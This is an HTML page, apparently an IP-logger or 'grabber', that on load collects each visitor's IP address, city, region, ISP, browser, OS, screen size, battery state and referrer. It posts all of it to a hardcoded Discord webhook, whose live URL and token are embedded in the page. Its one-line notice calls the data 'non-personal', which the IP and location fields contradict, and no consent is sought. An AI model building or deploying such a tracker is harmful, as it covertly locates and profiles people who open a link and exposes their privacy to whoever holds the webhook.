<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Who's There!</title>
    <!-- Load Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Use the Inter font from Google Fonts for a clean, modern look -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #1a202c;
            color: #e2e8f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            /* Subtle background pattern */
            background-image: radial-gradient(#2d3748 1px, transparent 1px);
            background-size: 20px 20px;
        }
        .container {
            background-color: rgba(45, 55, 72, 0.9);
            backdrop-filter: blur(10px);
            padding: 2.5rem;
            border-radius: 1rem;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
            text-align: center;
            max-width: 90%;
            width: 500px;
            border: 1px solid #4a5568;
            position: relative;
            overflow: hidden;
            animation: pulse-border 4s infinite alternate;
        }
        h1 {
            font-size: 2.5rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
            color: #ffffff;
            letter-spacing: 0.1em;
            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
            animation: neon-glow 1.5s infinite alternate;
        }
        p {
            font-size: 1rem;
            font-weight: 400;
            color: #a0aec0;
            animation: text-fade-in 2s forwards;
        }

        @keyframes neon-glow {
            from { text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; }
            to { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 30px #00ff00; }
        }

        @keyframes pulse-border {
            from { border-color: #4a5568; box-shadow: 0 0 15px rgba(0, 255, 0, 0.2); }
            to { border-color: #00ff00; box-shadow: 0 0 25px rgba(0, 255, 0, 0.4); }
        }

        @keyframes text-fade-in {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Who's There!</h1>
        <p class="mt-2 text-sm text-gray-400">
            This page is collecting some basic, non-personal system information to send to a Discord webhook.
        </p>
    </div>

    <script>
        // Wait for the entire page to load before executing the script
        window.addEventListener('DOMContentLoaded', (event) => {
            // This is the Discord webhook URL where the data will be sent.
            // Remember to replace this with your actual webhook URL.
            const webhookUrl = 'https://discord.com/api/webhooks/1406107665939042345/s8XXhrjJOdg5xYp4bMx3MsYaMhPpD-AXxnt3uOMUCdIErtabNOP-1BUMDX6Js5gXYK7p';

            // Function to get a generalized country/city location using multiple reliable APIs.
            // This makes the IP lookup more robust against API failures or network issues.
            async function fetchIpData() {
                const services = [
                    // Primary service: ip-api.com (using HTTPS for security)
                    { url: 'https://ip-api.com/json/', parse: data => ({ ip: data.query, city: data.city, country: data.country, isp: data.isp, region: data.regionName, timezone: data.timezone }) },
                    // Secondary service: ipinfo.io (as a fallback)
                    { url: 'https://ipinfo.io/json', parse: data => ({ ip: data.ip, city: data.city, country: data.country, isp: data.org, region: data.region, timezone: data.timezone }) }
                ];

                for (const service of services) {
                    try {
                        const response = await fetch(service.url);
                        if (!response.ok) {
                            console.warn(`Failed to fetch IP from ${service.url}, trying next service...`);
                            continue;
                        }
                        const data = await response.json();
                        // Check if the service returned a valid IP before returning
                        if (data.ip || data.query) {
                            return service.parse(data);
                        }
                    } catch (error) {
                        console.error(`Error fetching from ${service.url}:`, error);
                    }
                }
                // Return default values if all services fail
                return { ip: 'Unknown IP', city: 'Unknown City', country: 'Unknown Country', isp: 'Unknown ISP', region: 'Unknown Region', timezone: 'Unknown Timezone' };
            }

            // Function to determine the OS and device type from the user agent string.
            function getDeviceInfo() {
                const userAgent = navigator.userAgent;
                let os = 'Unknown OS';
                let browser = 'Unknown Browser';
                let platform = 'Unknown';

                // Detect OS
                if (userAgent.includes('Windows')) os = 'Windows';
                else if (userAgent.includes('Macintosh')) os = 'macOS';
                else if (userAgent.includes('Linux')) os = 'Linux';
                else if (userAgent.includes('Android')) os = 'Android';
                else if (userAgent.includes('iPhone')) os = 'iOS';
                else if (userAgent.includes('iPad')) os = 'iPadOS';

                // Detect Browser
                if (userAgent.includes('Edg')) browser = 'Microsoft Edge';
                else if (userAgent.includes('Chrome')) browser = 'Google Chrome';
                else if (userAgent.includes('Firefox')) browser = 'Mozilla Firefox';
                else if (userAgent.includes('Safari')) browser = 'Apple Safari';

                // Get Platform
                if (navigator.platform) {
                    platform = navigator.platform;
                }

                return { os, browser, platform };
            }

            // Function to get battery information if available
            async function getBatteryInfo() {
                try {
                    if ('getBattery' in navigator) {
                        const battery = await navigator.getBattery();
                        return {
                            level: `${(battery.level * 100).toFixed(0)}%`,
                            charging: battery.charging ? 'Yes' : 'No'
                        };
                    }
                } catch (e) {
                    console.error('Battery API not available or blocked:', e);
                }
                return { level: 'N/A', charging: 'N/A' };
            }

            // Main function to collect data and send to webhook
            async function sendVisitorInfo() {
                const now = new Date();
                const { os, browser, platform } = getDeviceInfo();
                const { country, city, isp, ip, region, timezone } = await fetchIpData();
                const { level, charging } = await getBatteryInfo();
                const screenResolution = `${screen.width}x${screen.height}`;
                const windowResolution = `${window.innerWidth}x${window.innerHeight}`;
                const cpuCores = navigator.hardwareConcurrency || 'Unknown';
                const referrer = document.referrer || 'Direct';

                // Construct the embed payload for Discord with a green color and boxed fields
                const payload = {
                    embeds: [{
                        title: "New Visitor Log ðŸ‘½",
                        color: 3066993, // A nice green color
                        fields: [
                            {
                                name: "Message ðŸš€",
                                value: "Visitor information collected securely. ðŸ•µï¸â€â™‚ï¸",
                                inline: false
                            },
                            {
                                name: "ðŸŒ Location Info",
                                value: `**IP Address:** \`${ip}\`\n**Country:** ${country}\n**Region:** ${region}\n**City:** ${city}\n**ISP:** ${isp}\n**Time Zone:** ${timezone}`,
                                inline: false
                            },
                            {
                                name: "ðŸ’» Device Info",
                                value: `**OS:** ${os}\n**Platform:** ${platform}\n**Browser:** ${browser}\n**Screen Resolution:** ${screenResolution}\n**Window Size:** ${windowResolution}\n**CPU Cores:** ${cpuCores}\n**Language:** ${navigator.language || 'Unknown'}`,
                                inline: false
                            },
                            {
                                name: "ðŸ”‹ Power & Connection",
                                value: `**Battery Level:** ${level}\n**Charging:** ${charging}\n**Network Type:** ${navigator.connection?.type || 'Unknown'}\n**Referrer:** ${referrer}`,
                                inline: false
                            },
                            {
                                name: "ðŸ“… Timestamps",
                                value: `**Timestamp:** ${now.toLocaleString()}\n**Page Load Time:** ${performance.now().toFixed(2)}ms`,
                                inline: false
                            }
                        ],
                        footer: {
                            text: "Visitor data sent to webhook.",
                            icon_url: "https://placehold.co/64x64/00ff37/ffffff?text=âœ…"
                        }
                    }]
                };

                // Send the payload to the webhook
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (!response.ok) {
                        console.error('Webhook failed to send:', response.status, response.statusText);
                    }
                })
                .catch(error => {
                    console.error('Error sending webhook:', error);
                });
            }

            // Call the main function to run the script
            sendVisitorInfo();
        });
    </script>
</body>
</html>
